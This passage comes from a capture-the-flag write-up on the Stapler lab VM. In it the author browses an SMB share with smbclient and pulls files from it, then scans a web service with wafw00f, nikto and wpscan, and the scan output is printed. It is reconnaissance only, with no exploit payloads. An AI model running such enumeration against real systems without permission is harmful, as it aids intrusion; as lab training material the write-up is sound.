+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Fri&nbsp;Jun&nbsp;&nbsp;3&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>52<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;2016<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Mon&nbsp;Jun&nbsp;&nbsp;6&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>39<span style="color:#ff9d00;font-weight:700">:</span>56&nbsp;2016<br>
+                &nbsp;&nbsp;kathy_stuff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Jun&nbsp;&nbsp;5&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>02<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;2016<br>
+                &nbsp;&nbsp;backup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Jun&nbsp;&nbsp;5&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>04<span style="color:#ff9d00;font-weight:700">:</span>14&nbsp;2016<br>
+                <br>
+                19478204&nbsp;blocks&nbsp;of&nbsp;size&nbsp;1024.&nbsp;16392680&nbsp;blocks&nbsp;available<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;kathy_stuff<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\k</span>athy_stuff<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Jun&nbsp;&nbsp;5&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>02<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;2016<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Fri&nbsp;Jun&nbsp;&nbsp;3&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>52<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;2016<br>
+                &nbsp;&nbsp;todo-list.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;64&nbsp;&nbsp;Sun&nbsp;Jun&nbsp;&nbsp;5&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>02<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;2016<br>
+                <br>
+                19478204&nbsp;blocks&nbsp;of&nbsp;size&nbsp;1024.&nbsp;16392688&nbsp;blocks&nbsp;available<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\k</span>athy_stuff<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;get&nbsp;todo-list.txt&nbsp;<br>
+                getting&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#333333;font-weight:400">\k</span>athy_stuff<span style="color:#333333;font-weight:400">\t</span>odo-list.txt&nbsp;of&nbsp;size&nbsp;64&nbsp;as&nbsp;todo-list.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>31.2&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>average&nbsp;31.2&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\k</span>athy_stuff<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;..<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;backup<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\b</span>ackup<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Jun&nbsp;&nbsp;5&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>04<span style="color:#ff9d00;font-weight:700">:</span>14&nbsp;2016<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Fri&nbsp;Jun&nbsp;&nbsp;3&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>52<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;2016<br>
+                &nbsp;&nbsp;vsftpd.conf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5961&nbsp;&nbsp;Sun&nbsp;Jun&nbsp;&nbsp;5&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>03<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;2016<br>
+                &nbsp;&nbsp;wordpress-4.tar.gz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;6321767&nbsp;&nbsp;Mon&nbsp;Apr&nbsp;27&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>14<span style="color:#ff9d00;font-weight:700">:</span>46&nbsp;2015<br>
+                <br>
+                19478204&nbsp;blocks&nbsp;of&nbsp;size&nbsp;1024.&nbsp;16392688&nbsp;blocks&nbsp;available<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\b</span>ackup<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;get&nbsp;vsftpd.conf<br>
+                getting&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#333333;font-weight:400">\b</span>ackup<span style="color:#333333;font-weight:400">\v</span>sftpd.conf&nbsp;of&nbsp;size&nbsp;5961&nbsp;as&nbsp;vsftpd.conf&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>2910.5&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>average&nbsp;1470.9&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\b</span>ackup<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;get&nbsp;wordpress-4.tar.gz<br>
+                getting&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#333333;font-weight:400">\b</span>ackup<span style="color:#333333;font-weight:400">\w</span>ordpress-4.tar.gz&nbsp;of&nbsp;size&nbsp;6321767&nbsp;as&nbsp;wordpress-4.tar.gz&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>22449.4&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>average&nbsp;22148.7&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\b</span>ackup<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span>
+            </div>
+        </div><br>
+        <br>
+        I couldn't find any useful information in the files downloaded from kathy's share. I feel like I probably missed something.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>Rabbit hole #3 - 12380/http</strong></h3><br>
+        I don't know if I made a mistake here or if it was the vm being funny. I felt confused browing manually, so ran scripts again:<br>
+        <br>
+        <code>wafw00f http://192.168.1.237:12380</code><br>
+        I ran this because 80/http reported a firewall.<br>
+        <br>
+        Nikto was useful.<br>
+            <div class="codebox">
+                nikto&nbsp;-h&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.237<span style="color:#ff9d00;font-weight:700">:</span>12380&nbsp;-o&nbsp;nikto.txt<br>
+                -&nbsp;Nikto&nbsp;v2.1.6<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;Target&nbsp;IP<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.1.237<br>
+                +&nbsp;Target&nbsp;Hostname<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;192.168.1.237<br>
+                +&nbsp;Target&nbsp;Port<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12380<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;SSL&nbsp;Info<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Subject<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>C=UK<span style="color:#ff9d00;font-weight:700">/</span>ST=Somewhere&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;the&nbsp;middle&nbsp;of&nbsp;nowhere<span style="color:#ff9d00;font-weight:700">/</span>L=Really,&nbsp;what&nbsp;are&nbsp;you&nbsp;meant&nbsp;to&nbsp;put&nbsp;here?<span style="color:#ff9d00;font-weight:700">/</span>O=Initech<span style="color:#ff9d00;font-weight:700">/</span>OU=Pam<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;I&nbsp;give&nbsp;up.&nbsp;no&nbsp;idea&nbsp;what&nbsp;to&nbsp;put&nbsp;here.<span style="color:#ff9d00;font-weight:700">/</span>CN=Red.Initech<span style="color:#ff9d00;font-weight:700">/</span>emailAddress=pam@red.localhost<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ciphers<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;ECDHE-RSA-AES256-GCM-SHA384<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Issuer<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>C=UK<span style="color:#ff9d00;font-weight:700">/</span>ST=Somewhere&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;the&nbsp;middle&nbsp;of&nbsp;nowhere<span style="color:#ff9d00;font-weight:700">/</span>L=Really,&nbsp;what&nbsp;are&nbsp;you&nbsp;meant&nbsp;to&nbsp;put&nbsp;here?<span style="color:#ff9d00;font-weight:700">/</span>O=Initech<span style="color:#ff9d00;font-weight:700">/</span>OU=Pam<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;I&nbsp;give&nbsp;up.&nbsp;no&nbsp;idea&nbsp;what&nbsp;to&nbsp;put&nbsp;here.<span style="color:#ff9d00;font-weight:700">/</span>CN=Red.Initech<span style="color:#ff9d00;font-weight:700">/</span>emailAddress=pam@red.localhost<br>
+                +&nbsp;Start&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2019-04-13&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>08<span style="color:#ff9d00;font-weight:700">:</span>36&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GMT1<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;Server<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ...<br>
+                +&nbsp;Entry&nbsp;<span style="color:#3ad900;font-weight:400">'/admin112233/'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;robots.txt&nbsp;returned&nbsp;a&nbsp;non-forbidden&nbsp;or&nbsp;redirect&nbsp;HTTP&nbsp;code&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                +&nbsp;Entry&nbsp;<span style="color:#3ad900;font-weight:400">'/blogblog/'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;robots.txt&nbsp;returned&nbsp;a&nbsp;non-forbidden&nbsp;or&nbsp;redirect&nbsp;HTTP&nbsp;code&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                +&nbsp;<span style="color:#3ad900;font-weight:400">"robots.txt"</span>&nbsp;contains&nbsp;2&nbsp;entries&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;should&nbsp;be&nbsp;manually&nbsp;viewed.<br>
+                ...<br>
+                +&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>phpmyadmin<span style="color:#ff9d00;font-weight:700">/:</span>&nbsp;phpMyAdmin&nbsp;directory&nbsp;found<br>
+                +&nbsp;8071&nbsp;requests<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0&nbsp;error<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;and&nbsp;16&nbsp;item<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;reported&nbsp;on&nbsp;remote&nbsp;host<br>
+                +&nbsp;End&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2019-04-13&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GMT1<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>145&nbsp;seconds<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;1&nbsp;host<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;tested
+            </div>
+        </div><br>
+        <br>
+        The site is actually HTTPS, which explains why it acts odd when browing http.<br>
+        Nikto also found some obscure directories inside of /robots.txt - /admin112233 and /blogblog (which is the wordpress section)<br>
+        <br>
+        If I try to access this area of the site e.g. <code>https://192.168.1.237:12380/blogblog/wp-login.php</code> it tries to redirect me to 192.168.56.103 and I have no idea why. The IP of my Stapler box is 192.168.1.237, so I wasn't sure what was going.<br>
+        <br>
+        wpscan would return results, but navigating to any of the URLs it would just try to redirect me.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1#&nbsp;wpscan&nbsp;--url&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.237<span style="color:#ff9d00;font-weight:700">:</span>12380<span style="color:#ff9d00;font-weight:700">/</span>blogblog<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;--disable-tls-checks&nbsp;--wp-content-dir&nbsp;wp-content<br>
+                _______________________________________________________________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_______&nbsp;&nbsp;&nbsp;_____<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\&nbsp;\&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;&nbsp;__&nbsp;<span style="color:#333333;font-weight:400">\&nbsp;</span><span style="color:#ff9d00;font-weight:700">/</span>&nbsp;____<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\&nbsp;\&nbsp;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#333333;font-weight:400">\&nbsp;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>__)&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>___&nbsp;&nbsp;&nbsp;___&nbsp;&nbsp;__&nbsp;_&nbsp;_&nbsp;__&nbsp;®<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\&nbsp;\/</span>&nbsp;&nbsp;<span style="color:#333333;font-weight:400">\/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;___<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#333333;font-weight:400">\_</span>__&nbsp;<span style="color:#333333;font-weight:400">\&nbsp;</span><span style="color:#ff9d00;font-weight:700">/</span>&nbsp;__<span style="color:#ff9d00;font-weight:700">|/</span>&nbsp;_<span style="color:#333333;font-weight:400">`&nbsp;|&nbsp;'_&nbsp;\</span><br>
+                <span style="color:#333333;font-weight:400">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;/\&nbsp;&nbsp;/&nbsp;&nbsp;|&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____)&nbsp;|&nbsp;(__|&nbsp;(_|&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;|_|&nbsp;&nbsp;&nbsp;&nbsp;|_____/&nbsp;\___|\__,_|_|&nbsp;|_|<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WordPress&nbsp;Security&nbsp;Scanner&nbsp;by&nbsp;the&nbsp;WPScan&nbsp;Team<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Version&nbsp;3.5.0<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sponsored&nbsp;by&nbsp;Sucuri&nbsp;-&nbsp;https://sucuri.net<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@_WPScan_,&nbsp;@ethicalhack3r,&nbsp;@erwan_lr,&nbsp;@_FireFart_<br>
+                _______________________________________________________________<br>
+                <br>
+                [i]&nbsp;It&nbsp;seems&nbsp;like&nbsp;you&nbsp;have&nbsp;not&nbsp;updated&nbsp;the&nbsp;database&nbsp;for&nbsp;some&nbsp;time.<br>
+                [?]&nbsp;Do&nbsp;you&nbsp;want&nbsp;to&nbsp;update&nbsp;now?&nbsp;[Y]es&nbsp;[N]o,&nbsp;default:&nbsp;[N]<br>
+                [+]&nbsp;URL:&nbsp;https://192.168.1.237:12380/blogblog/<br>
+                [+]&nbsp;Started:&nbsp;Sun&nbsp;Apr&nbsp;14&nbsp;18:51:21&nbsp;2019<br>
+                <br>
+                Interesting&nbsp;Finding(s):<br>
+                <br>
+                [+]&nbsp;https://192.168.1.237:12380/blogblog/<br>
+                &nbsp;|&nbsp;Interesting&nbsp;Entries:<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;Server:&nbsp;Apache/2.4.18&nbsp;(Ubuntu)<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;Dave:&nbsp;Soemthing&nbsp;doesn't&nbsp;look&nbsp;right&nbsp;here<br>
+                &nbsp;|&nbsp;Found&nbsp;By:&nbsp;Headers&nbsp;(Passive&nbsp;Detection)<br>
+                &nbsp;|&nbsp;Confidence:&nbsp;100%<br>
+                <br>
+                [+]&nbsp;https://192.168.1.237:12380/blogblog/xmlrpc.php<br>
+                &nbsp;|&nbsp;Found&nbsp;By:&nbsp;Direct&nbsp;Access&nbsp;(Aggressive&nbsp;Detection)<br>
+                &nbsp;|&nbsp;Confidence:&nbsp;100%<br>
+                &nbsp;|&nbsp;References:<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;http://codex.wordpress.org/XML-RPC_Pingback_API<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access<br>
+                <br>
+                [+]&nbsp;https://192.168.1.237:12380/blogblog/readme.html<br>
+                &nbsp;|&nbsp;Found&nbsp;By:&nbsp;Direct&nbsp;Access&nbsp;(Aggressive&nbsp;Detection)<br>
+                &nbsp;|&nbsp;Confidence:&nbsp;100%<br>
+                <br>
+                [+]&nbsp;Registration&nbsp;is&nbsp;enabled:&nbsp;https://192.168.1.237:12380/blogblog/wp-login.php?action=register<br>
+                &nbsp;|&nbsp;Found&nbsp;By:&nbsp;Direct&nbsp;Access&nbsp;(Aggressive&nbsp;Detection)<br>
+                &nbsp;|&nbsp;Confidence:&nbsp;100%<br>
+                <br>
+                [+]&nbsp;Upload&nbsp;directory&nbsp;has&nbsp;listing&nbsp;enabled:&nbsp;https://192.168.1.237:12380/blogblog/wp-content/uploads/<br>
+                &nbsp;|&nbsp;Found&nbsp;By:&nbsp;Direct&nbsp;Access&nbsp;(Aggressive&nbsp;Detection)<br>
+                &nbsp;|&nbsp;Confidence:&nbsp;100%<br>
+                <br>
+                [+]&nbsp;https://192.168.1.237:12380/blogblog/wp-cron.php<br>
+                &nbsp;|&nbsp;Found&nbsp;By:&nbsp;Direct&nbsp;Access&nbsp;(Aggressive&nbsp;Detection)<br>
+                &nbsp;|&nbsp;Confidence:&nbsp;60%<br>
+                &nbsp;|&nbsp;References:<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;https://www.iplocation.net/defend-wordpress-from-ddos<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;https://github.com/wpscanteam/wpscan/issues/1299<br>
+                <br>
+                ...<br>
+                <br>
+                [i]&nbsp;The&nbsp;main&nbsp;theme&nbsp;could&nbsp;not&nbsp;be&nbsp;detected.<br>
+                <br>
+                [+]&nbsp;Enumerating&nbsp;All&nbsp;Plugins&nbsp;(via&nbsp;Passive&nbsp;Methods)<br>
+                <br>
+                [i]&nbsp;No&nbsp;plugins&nbsp;Found.<br>
+                <br>
+                [+]&nbsp;Enumerating&nbsp;Config&nbsp;Backups&nbsp;(via&nbsp;Passive&nbsp;and&nbsp;Aggressive&nbsp;Methods)<br>
+                &nbsp;Checking&nbsp;Config&nbsp;Backups&nbsp;-&nbsp;Time:&nbsp;00:00:00&nbsp;&lt;=========================&gt;&nbsp;(21&nbsp;/&nbsp;21)&nbsp;100.00%&nbsp;Time:&nbsp;00:00:00<br>
+                <br>
+                [i]&nbsp;No&nbsp;Config&nbsp;Backups&nbsp;Found.<br>
+                <br>
+                <br>
+                [+]&nbsp;Finished:&nbsp;Sun&nbsp;Apr&nbsp;14&nbsp;18:51:22&nbsp;2019<br>
+                [+]&nbsp;Requests&nbsp;Done:&nbsp;39<br>
+                [+]&nbsp;Cached&nbsp;Requests:&nbsp;7<br>
